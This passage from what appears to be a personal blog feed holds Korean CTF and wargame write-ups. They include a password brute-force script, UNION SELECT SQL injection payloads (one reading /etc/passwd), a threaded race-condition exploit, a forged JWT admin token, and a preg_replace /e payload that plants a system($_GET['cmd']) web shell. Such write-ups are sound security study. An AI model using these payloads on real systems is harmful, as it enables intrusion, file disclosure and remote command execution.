class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line">param = <span class="string">&quot;http://www.zixem.altervista.org/SQLi/login_do.php?pass=&quot;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">r = requests.get(param)</span><br><span class="line"><span class="built_in">print</span> param</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Brute Force&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;found key: &quot;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><hr><h3 id="6-LEVEL-6"><a href="#6-LEVEL-6" class="headerlink" title="6. LEVEL-6"></a>6. LEVEL-6</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serial<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">201</span><span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>id,teacher,teacher_age,price<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>teachers<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">20</span><span class="keyword">where</span><span class="operator">%</span><span class="number">20</span>id<span class="operator">=</span><span class="number">11</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><hr><h3 id="7-LEVEL-7"><a href="#7-LEVEL-7" class="headerlink" title="7. LEVEL-7"></a>7. LEVEL-7</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,version(),<span class="number">3</span>;<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure><hr><h3 id="8-LEVEL-8"><a href="#8-LEVEL-8" class="headerlink" title="8. LEVEL-8"></a>8. LEVEL-8</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">09</span><span class="keyword">union</span><span class="operator">%</span><span class="number">09</span>seselectlect<span class="operator">%</span><span class="number">091</span>,version(),<span class="number">3</span>;<span class="comment">--%09-</span></span><br></pre></td></tr></table></figure><hr><h3 id="9-LEVEL-9"><a href="#9-LEVEL-9" class="headerlink" title="9. LEVEL-9"></a>9. LEVEL-9</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>&quot;../etc/passwd&quot;,<span class="number">2</span>;<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure><hr><h3 id="10-LEVEL-10"><a href="#10-LEVEL-10" class="headerlink" title="10. LEVEL-10"></a>10. LEVEL-10</h3><ul><li>php uuencode -&gt; base64 encode</li></ul><p>x=PywiIVU7RkVPO0IhUzk2UUU4VzBALDJRVjk3KVM6Nl1OKiJEWysyVEArMGBgCmAK</p><hr><h3 id="ALL-CLEAR"><a href="#ALL-CLEAR" class="headerlink" title="ALL CLEAR"></a>ALL CLEAR</h3>]]></content>
      
      
      <categories>
          
          <category> Wargame </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web, Wargame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TRUST CTF 2019 Write up</title>
      <link href="2020/02/23/trustctf-200223/"/>
      <url>2020/02/23/trustctf-200223/</url>
      
        <content type="html"><![CDATA[<h3 id="1-web-ezrc"><a href="#1-web-ezrc" class="headerlink" title="1. (web) ezrc"></a>1. (web) ezrc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> session_start(); <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        header(<span class="string">&#x27;Location: ./login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;a href=<span class="string">&quot;source.php&quot;</span>&gt;&lt;button&gt;source code&lt;/button&gt;&lt;br/&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = mysqli_query(<span class="variable">$con</span>, <span class="string">&quot;select pw from ezrc where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="variable">$idx</span> = mysqli_fetch_array(<span class="variable">$res</span>);</span><br><span class="line">    <span class="variable">$pw</span> = <span class="variable">$idx</span>[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$print_query</span> = <span class="string">&quot;select chk from ezrc where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$hehe_query</span> = <span class="string">&quot;update ezrc set chk=&#x27;<span class="subst">$hehe</span>&#x27; where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$reset_query</span> = <span class="string">&quot;update ezrc set chk=&#x27;nope&#x27; where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=logout.php&gt;logout&lt;/a&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;your id is &quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/(tata|dada|zaza)+[a-z]&#123;3&#125;+coco?hehe/&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]) &amp;&amp; strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])&gt;<span class="number">30</span>)&#123;</span><br><span class="line">        <span class="variable">$res</span> = mysqli_query(<span class="variable">$con</span>, <span class="variable">$print_query</span>);</span><br><span class="line">        <span class="variable">$idx</span> = mysqli_fetch_array(<span class="variable">$res</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;your chk is &quot;</span>.<span class="variable">$idx</span>[<span class="string">&#x27;chk&#x27;</span>].<span class="string">&quot;&lt;br/&gt;&quot;</span>;        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$idx</span>[<span class="string">&#x27;chk&#x27;</span>] == <span class="variable">$hehe</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">            mysqli_query(<span class="variable">$con</span>, <span class="variable">$reset_query</span>);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;congratulations&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    mysqli_query(<span class="variable">$con</span>, <span class="variable">$hehe_query</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;trust_is_very_cooool&quot;</span>;</span><br><span class="line">    <span class="variable">$t</span> = (<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;times&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pw</span> == md5(<span class="number">240610708</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;pw right&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$t</span>; <span class="variable">$i</span>=<span class="variable">$i</span>+<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span>&lt;<span class="variable">$t</span>; <span class="variable">$j</span>=<span class="variable">$j</span>+<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="variable">$str</span> = md5(<span class="variable">$str</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$str</span> == <span class="string">&quot;d91a2796ab967c9793ef1c628a91fac5&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            mysqli_query(<span class="variable">$con</span>, <span class="variable">$reset_query</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        mysqli_query(<span class="variable">$con</span>, <span class="variable">$reset_query</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>레이스 컨디션(race condition) 을 이용하는 문제이다.</p><p>서로 다른 브라우저(세션) 을 가지고 동시에 요청하면 다른 한 브라우저에서 플래그를 넘겨준다.</p><p>CTF에서 레이스 컨디션을 사용한 문제를 본 것이 조금 신기하다. (잘 못보던 케이스)</p><p>암튼 파이썬으로 코딩해서 문제를 풀어주면 된다.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">cookie1 = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;bb11&#x27;</span>&#125;</span><br><span class="line">cookie2 = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;bb22&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">cookie</span>):</span></span><br><span class="line">    url = <span class="string">&quot;http://198.13.32.181:4345/login_check.php&quot;</span></span><br><span class="line">    param = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;bb&#x27;</span>,<span class="string">&#x27;pw&#x27;</span>:<span class="string">&#x27;bb&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(url, data=param, cookies=cookie)</span><br><span class="line">    <span class="built_in">print</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">times</span>():</span></span><br><span class="line">    <span class="keyword">global</span> cookie1;</span><br><span class="line">    url = <span class="string">&quot;http://198.13.32.181:4345/index.php?times=111111111111111111111111111111&quot;</span></span><br><span class="line">    r = requests.get(url, cookies=cookie1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="keyword">global</span> cookie2;</span><br><span class="line">    url = <span class="string">&quot;http://198.13.32.181:4345/index.php?key=tatadadazazaabccocoheheaaaaaaaaaaaaa&quot;</span></span><br><span class="line">    r = requests.get(url, cookies=cookie2)</span><br><span class="line">    <span class="built_in">print</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    login(cookie1)</span><br><span class="line">    login(cookie2)</span><br><span class="line">    t1 = threading.Thread(target=times,args=())</span><br><span class="line">    t2 = threading.Thread(target=flag,args=())</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p><code> Thank you (NGA) </code></p><hr><h3 id="2-web-jpg-viewer"><a href="#2-web-jpg-viewer" class="headerlink" title="2. (web) jpg viewer"></a>2. (web) jpg viewer</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  session_start();</span><br><span class="line">  <span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/jwt.php&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;PHPSESSJWT&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="variable">$jwt</span>-&gt;hashing(<span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&#x27;admin&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&#x27;iat&#x27;</span> =&gt; time(),</span><br><span class="line">    ));</span><br><span class="line">    setcookie(<span class="string">&#x27;PHPSESSJWT&#x27;</span>, <span class="variable">$token</span>, time() + <span class="number">86400</span> * <span class="number">30</span>);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/jwt.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;PHPSESSJWT&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$token</span>) &#123;</span><br><span class="line">        <span class="variable">$body</span> = <span class="variable">$jwt</span>-&gt;dehashing(<span class="variable">$token</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">      <span class="keyword">echo</span> highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">      <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">imageanalyze</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;Where is the File?&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(!exif_read_data(<span class="variable">$file</span>))&#123;</span><br><span class="line">            unlink(<span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> exif_read_data(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;JPG&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;JPG&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;JPG&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$upload_directory</span> = <span class="string">&#x27;./uploads/&#x27;</span>;</span><br><span class="line">        <span class="variable">$ext_str</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$max_file_size</span> = <span class="number">5242880</span>;</span><br><span class="line">        <span class="variable">$ext</span> = explode(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$ext</span> = strtolower(array_pop(<span class="variable">$ext</span>));</span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$ext</span>, <span class="variable">$ext_str</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;jpg파일만 업로드 할 수 있습니다.&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt;= <span class="variable">$max_file_size</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;파일은 5MB 까지만 업로드 가능합니다.&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$path</span> = <span class="variable">$upload_directory</span>.session_id();</span><br><span class="line">        <span class="variable">$updir</span> = <span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        mkdir(<span class="variable">$path</span>,<span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$updir</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;파일 업로드 성공!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;<span class="subst">$updir</span>&#x27;&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$infor</span> = imageanalyze(<span class="variable">$updir</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;업로드 에러!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$infor</span>))&#123;</span><br><span class="line">    <span class="variable">$Date</span> = <span class="variable">$infor</span>[<span class="string">&#x27;DateTimeOriginal&#x27;</span>];</span><br><span class="line">    <span class="variable">$Model</span> = <span class="variable">$infor</span>[<span class="string">&#x27;Model&#x27;</span>];</span><br><span class="line">    <span class="variable">$Make</span> = <span class="variable">$infor</span>[<span class="string">&#x27;Make&#x27;</span>];</span><br><span class="line">    <span class="variable">$size</span> = round(<span class="variable">$infor</span>[<span class="string">&#x27;FileSize&#x27;</span>]/<span class="number">1024</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;파일명 : <span class="subst">&#123;$infor[&#x27;FileName&#x27;]&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;파일 크기 : <span class="subst">&#123;$size&#125;</span>KB&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(array_key_exists(<span class="string">&#x27;DateTimeOriginal&#x27;</span>,<span class="variable">$infor</span>))&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;촬영 시간 : <span class="subst">&#123;$Date&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$date</span> = date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, <span class="variable">$infor</span>[<span class="string">&#x27;FileDateTime&#x27;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;업로드 시간 : <span class="subst">&#123;$date&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(array_key_exists(<span class="string">&#x27;Model&#x27;</span>,<span class="variable">$infor</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$infor</span>[<span class="string">&#x27;Model&#x27;</span>]))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;카메라 모델 : <span class="subst">&#123;$Model&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$body</span>[<span class="string">&#x27;admin&#x27;</span>]==<span class="literal">true</span>)&#123;</span><br><span class="line">      <span class="variable">$edit</span> = explode(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$_COOKIE</span>[<span class="string">&#x27;edit&#x27;</span>]);</span><br><span class="line">      preg_replace(<span class="variable">$$edit</span>[<span class="number">0</span>],<span class="variable">$$edit</span>[<span class="number">1</span>],<span class="variable">$$edit</span>[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이번에도 코드가 좀 길다, 한번 분석해보자.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$body</span>[<span class="string">&#x27;admin&#x27;</span>]==<span class="literal">true</span>)&#123;</span><br><span class="line">      <span class="variable">$edit</span> = explode(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$_COOKIE</span>[<span class="string">&#x27;edit&#x27;</span>]);</span><br><span class="line">      preg_replace(<span class="variable">$$edit</span>[<span class="number">0</span>],<span class="variable">$$edit</span>[<span class="number">1</span>],<span class="variable">$$edit</span>[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>이 부분에 보면 쿠키 값의 admin이 true를 가질 때,</p><p>edit의 쿠키를 가지고 preg_replace 함수의 인자로 사용한다.</p><p>처음엔 좀 생각 했는데, 검색 하다가 우연히 preg_replace 함수에 대해</p><p>RCE 문서를 찾을 수 있었다. 그렇다 이 문제도 동일한 취약점을 사용하고 있다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Date</span> = <span class="variable">$infor</span>[<span class="string">&#x27;DateTimeOriginal&#x27;</span>];</span><br><span class="line"><span class="variable">$Model</span> = <span class="variable">$infor</span>[<span class="string">&#x27;Model&#x27;</span>];</span><br><span class="line"><span class="variable">$Make</span> = <span class="variable">$infor</span>[<span class="string">&#x27;Make&#x27;</span>];</span><br><span class="line"><span class="variable">$size</span> = round(<span class="variable">$infor</span>[<span class="string">&#x27;FileSize&#x27;</span>]/<span class="number">1024</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>이 부분에서 업로드 하는 jpg 파일의 사진 정보 값을 담고 출력 해주니,</p><p>$model, $make 에 공격 페이로드를 넣고 admin 쿠키를 조작 해 preg_replace 함수로</p><p>흘러가게 해주면 된다.</p><p>세션 조작은 문제에서 만들어주는 형태와 동일하게 새 jwt 세션을 만들어서</p><p>바꿔주면 된다. (아래 참고)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;jwt.php&quot;</span>;</span><br><span class="line"><span class="variable">$jwt</span> = <span class="keyword">new</span> jwt();</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$jwt</span>-&gt;hashing(<span class="keyword">array</span>(</span><br><span class="line">        ‘admin’=&gt;’<span class="literal">true</span>’,</span><br><span class="line">        ‘iat’=&gt;time()</span><br><span class="line">));</span><br><span class="line">var_dump(<span class="variable">$token</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Model=/a/e &amp; Make=eval(base64_decode(‘c3lzdGVtKCRfR0VUWydjbWQnXSk7’));<br>?cmd=ls &amp; ?cmd=/flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web, CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP &amp; SSE Instruction</title>
      <link href="2020/02/10/rop-instruction-200210/"/>
      <url>2020/02/10/rop-instruction-200210/</url>
      
        <content type="html"><![CDATA[<h3 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h3><p><a href="https://www.notion.so/jhyeon/ROP-SSE-Instruction-ca573f7740ae4301ad61b455a140b659">https://www.notion.so/jhyeon/ROP-SSE-Instruction-ca573f7740ae4301ad61b455a140b659</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
